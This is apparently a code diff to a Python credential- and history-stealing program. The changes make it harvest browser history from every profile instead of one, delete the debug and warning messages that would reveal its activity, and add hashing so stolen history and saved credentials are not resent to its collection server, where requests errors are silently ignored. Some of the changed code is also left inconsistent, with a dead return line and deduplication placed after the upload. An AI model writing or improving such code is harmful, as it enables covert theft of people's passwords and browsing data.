@@ -10,6 +10,7 @@ import tempfile
 import requests
 import platform
 import threading
+import hashlib
 from datetime import datetime, timedelta
 from threading import Thread
 from base64 import b64decode
@@ -79,24 +80,20 @@ def extract_history_from_sqlite(path, query, parse_row_fn):
             except Exception:
                 pass
 
-def extract_history_generic(name, base_path, query, parser, profile_match="default", file="places.sqlite"):
+def extract_history_generic(name, base_path, query, parser, file="places.sqlite"):
     if not os.path.exists(base_path):
-        print(f"[WARN] Base path missing: {base_path}")
         return []
-
-    print(f"[DEBUG] Scanning profiles in: {base_path}")
-    profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d))]
-    print(f"[DEBUG] Profiles found: {profiles}")
-
-    if not profiles:
-        print(f"[WARN] No profiles found for {name}")
-        return []
-
-    selected = next((p for p in profiles if profile_match in p), profiles[0])
-    print(f"[DEBUG] Using profile: {selected}")
-
-    full_path = os.path.join(base_path, selected, file)
-    print(f"[DEBUG] Extracting from: {full_path}")
+    entries = []
+    if os.path.isdir(base_path):
+        profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d))]
+        for profile in profiles:
+            path = os.path.join(base_path, profile, file)
+            if os.path.exists(path):
+                extracted = extract_history_from_sqlite(path, query, parser)
+                entries.extend(extracted)
+    else:
+        entries.extend(extract_history_from_sqlite(base_path, query, parser))
+    return entries
 
     return extract_history_from_sqlite(full_path, query, parser)
 
@@ -222,6 +219,19 @@ def get_ip_address():
                 return entry.address
     return "0.0.0.0"
 
+# ========== Multiple Data Check ========
+_sent_hashes = set()
+
+def hash_entry(entry):
+    return hashlib.sha256(repr(entry).encode()).hexdigest()
+
+def is_duplicate(entry):
+    h = hash_entry(entry)
+    if h in _sent_hashes:
+        return True
+    _sent_hashes.add(h)
+    return False
+
 # ========== COMMUNICATION ==========
 def send_data_once():
     try:
@@ -243,6 +253,11 @@ def send_data_once():
                 "machine_id": MACHINE_ID,
                 "credentials": credentials
             }, timeout=10)
+
+        # Multiple data check
+        history = [h for h in get_browser_history() if not is_duplicate(h)]
+        credentials = [c for c in get_saved_credentials() if not is_duplicate(c)]
+
 
     except requests.RequestException:
         pass
